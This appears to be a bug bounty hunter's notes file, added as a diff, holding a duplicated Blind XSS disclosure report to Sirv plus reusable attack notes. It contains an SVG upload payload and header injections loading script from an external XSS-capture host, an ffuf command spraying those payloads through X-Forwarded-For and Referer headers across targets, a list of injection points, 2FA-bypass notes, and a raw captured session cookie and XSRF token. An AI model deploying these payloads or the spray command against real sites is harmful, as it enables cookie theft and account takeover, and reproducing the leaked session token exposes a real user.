@@ -1,0 +1,237 @@
+Hello Sirv team,
+
+
+I aditya shende found Blind XSS in of your domain , Please look into the report
+
+
+Title: 
+Insecure client side validation on file upload leads to Blind XSS
+
+
+Description:
+Blind XSS vulnerabilities are a variant of persistent XSS vulnerabilities. They occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker’s payload will be loaded. The attacker input can be executed in a completely different application (for example an internal application where the administrator reviews the access logs or the application exceptions).
+
+Steps:
+1. Save following code in any.svg.png
+
+Code:
+
+<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve">
+    <!-- Script linked from the outside-->
+    <script xlink:href="https://moneyhack.xss.ht"/>
+    <script>
+      //<![CDATA[
+        alert("BLIND XSS");
+      ]]>
+    </script>
+  </svg>
+ 2. Navigate to file upload
+ 3. Upload the any.svg.png file and capture request in proxy tool
+ 4. In request change file name from any.svg.png to any.svg 
+ 5. Do  intercept > Response to this request (To check file is uploaded or not)
+ 6. forward request
+ 7. Copy the link file and paste in browser
+
+
+POST request:
+
+POST /api/upload/1640427903232?to=%2Faditya.svg HTTP/1.1
+Host: my.sirv.com
+User-Agent:"><script src=https://moneyhack.xss.ht></script>
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:"><script src=https://moneyhack.xss.ht></script>
+XSRF-TOKEN: M4SHnwJO--j3YGVnqmLJi470sVHuin_fhLfA
+Content-Type: image/png
+Content-Length: 349
+Origin: https://my.sirv.com
+Connection: close
+Cookie: sirv_session=Nt4kZ3GeirY7YykgnKTXPQ.yrbGGdybBJNcozVb7eJ-DHS_KL62PAzENHQq4N72TRmIUXmg9cekxe_eQp87S7-Oa9RxkNY-MtKHGtN7UHFMVjXUINY_fVwKCKYIxJZKnZdoQJadEZIcIo190RkUIxDBYyZh-HyEj5XjBOY7cm4DAqGmAKYVxfShA9ifCxyRDKaebHl9t1m9SLPTsokFkCkC_pIu9FOxSteO3TnIvhg2RyHx5H81IN0awD9Zsv0QI4p2m3XW4sEjRXixrk6K-U18qi4cElo3wPbzkTYoaQfI92ddSLYl79LJtoOfjDs_JuUwa8LRY-fu1bS4X5_BF9lz36Or-3C0GdqFUj-k5bJ8IA2e4FYdNMWzByDRRDR-L0U.1640103704013.604800000._DDeb8aJLQZmGkv5iIBQmlZwxPj23mo9o_6zb0AGAMk; _gcl_au=1.1.351614564.1640103704; _ga_J0FW6VX2VL=GS1.1.1640426071.2.1.1640426072.59; 
+
+<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve">
+    <!-- Script linked from the outside-->
+    <script xlink:href="https://moneyhack.xss.ht"/>
+    <script>
+      //<![CDATA[
+        alert("VERIFIED DOCS");
+      ]]>
+    </script>
+  </svg>
+
+
+Impact:
+1. Able to get cookies of user
+2. Extrac DOM code 
+3. User IP revealed to get exact location
+4. Screenshot of user display
+5. Cookies may include sensetive information like tokens
+
+
+Resource:
+https://hackerone.com/reports/1010466
+https://www.e-spincorp.com/documentation/blind-cros
+
+
+1 Blind XSS
+
+CS = SS 
+
+XSShunter = Profile
+
+Payloads:
+
+Register = Name , Last name , Input info
+Feedback section = Admin check feedback
+Forms = Bio , Name , Last name , Comments 
+Contact forms 
+
+Image upload :  SVG
+Headers : Match and replace  : ref xff
+
+
+
+ffuf
+ffuf -w msrc.txt -u FUZZ -H "X-Forwarded-For: ><script src=https://moneyhack.xss.ht></script> " -H Referer: ><script src=https://moneyhack.xss.ht></script> " -mc 200
+
+
+Image upload: 
+
+<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve">
+    <!-- Script linked from the outside-->
+    <script xlink:href="https://moneyhack.xss.ht"/>
+    <script>
+      //<![CDATA[
+        alert("VERIFIED DOCS");
+      ]]>
+    </script>
+  </svg>
+
+
+  save as any.svg.png
+
+
+Report writing :
+1. Escalate vuln
+2. Include each steps 
+3. Desciprtion shoud be tradional ,  Title should present view of bug
+4. Impact will be realtime 
+
+
+
+
+1.Introduction:
+2. Description
+3. Steps
+4. Impact
+5. Resources
+
+Hello Sirv team,
+
+
+I aditya shende found Blind XSS in of your domain , Please look into the report
+
+
+Title: 
+Insecure client side validation on file upload leads to Blind XSS
+
+
+Description:
+Blind XSS vulnerabilities are a variant of persistent XSS vulnerabilities. They occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker’s payload will be loaded. The attacker input can be executed in a completely different application (for example an internal application where the administrator reviews the access logs or the application exceptions).
+
+Steps:
+1. Save following code in any.svg.png
+
+Code:
+
+<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve">
+    <!-- Script linked from the outside-->
+    <script xlink:href="https://moneyhack.xss.ht"/>
+    <script>
+      //<![CDATA[
+        alert("BLIND XSS");
+      ]]>
+    </script>
+  </svg>
+ 2. Navigate to file upload
+ 3. Upload the any.svg.png file and capture request in proxy tool
+ 4. In request change file name from any.svg.png to any.svg 
+ 5. Do  intercept > Response to this request (To check file is uploaded or not)
+ 6. forward request
+ 7. Copy the link file and paste in browser
+
+
+POST request:
+
+POST /api/upload/1640427903232?to=%2Faditya.svg HTTP/1.1
+Host: my.sirv.com
+User-Agent:"><script src=https://moneyhack.xss.ht></script>
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:"><script src=https://moneyhack.xss.ht></script>
+XSRF-TOKEN: M4SHnwJO--j3YGVnqmLJi470sVHuin_fhLfA
+Content-Type: image/png
+Content-Length: 349
+Origin: https://my.sirv.com
+Connection: close
+Cookie: sirv_session=Nt4kZ3GeirY7YykgnKTXPQ.yrbGGdybBJNcozVb7eJ-DHS_KL62PAzENHQq4N72TRmIUXmg9cekxe_eQp87S7-Oa9RxkNY-MtKHGtN7UHFMVjXUINY_fVwKCKYIxJZKnZdoQJadEZIcIo190RkUIxDBYyZh-HyEj5XjBOY7cm4DAqGmAKYVxfShA9ifCxyRDKaebHl9t1m9SLPTsokFkCkC_pIu9FOxSteO3TnIvhg2RyHx5H81IN0awD9Zsv0QI4p2m3XW4sEjRXixrk6K-U18qi4cElo3wPbzkTYoaQfI92ddSLYl79LJtoOfjDs_JuUwa8LRY-fu1bS4X5_BF9lz36Or-3C0GdqFUj-k5bJ8IA2e4FYdNMWzByDRRDR-L0U.1640103704013.604800000._DDeb8aJLQZmGkv5iIBQmlZwxPj23mo9o_6zb0AGAMk; _gcl_au=1.1.351614564.1640103704; _ga_J0FW6VX2VL=GS1.1.1640426071.2.1.1640426072.59; 
+
+<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve">
+    <!-- Script linked from the outside-->
+    <script xlink:href="https://moneyhack.xss.ht"/>
+    <script>
+      //<![CDATA[
+        alert("VERIFIED DOCS");
+      ]]>
+    </script>
+  </svg>
+
+
+Impact:
+1. Able to get cookies of user
+2. Extrac DOM code 
+3. User IP revealed to get exact location
+4. Screenshot of user display
+5. Cookies may include sensetive information like tokens
+
+
+Resource:
+https://hackerone.com/reports/1010466
+https://www.e-spincorp.com/documentation/blind-cross-site-scripting-xss-attack-vulnerability-alert-and-solution/
+
+
+Coinbas emp:
+
+1. customer not trust the company
+2. Users will not use coinbase if they see that data
+3. loss of repution
+4. Zero privacy
+5. other company not gonna collab
+6. Financial losses
+7. Company PR
+8. Effects on shares of orgnisation
+9. insider tradings
+10. Client risk to do further proccess
+
+
+2FA bypass 
+
+1. we can register with fake number
+2. Lack of security measures
+3. Weak auth
+4. ATO
+5. No use of security / 2fa
+
+
+
+unauth access
+unauth access bypass
+
+1. Jira/Atlassian is third party so do check policy of programme
+2. Always check logo
+3. Try to get information
+
+https://jira.typo3.com/servicedesk/customer/user/signup
+
+https://cdap.atlassian.net/servicedesk/customer/user/signup
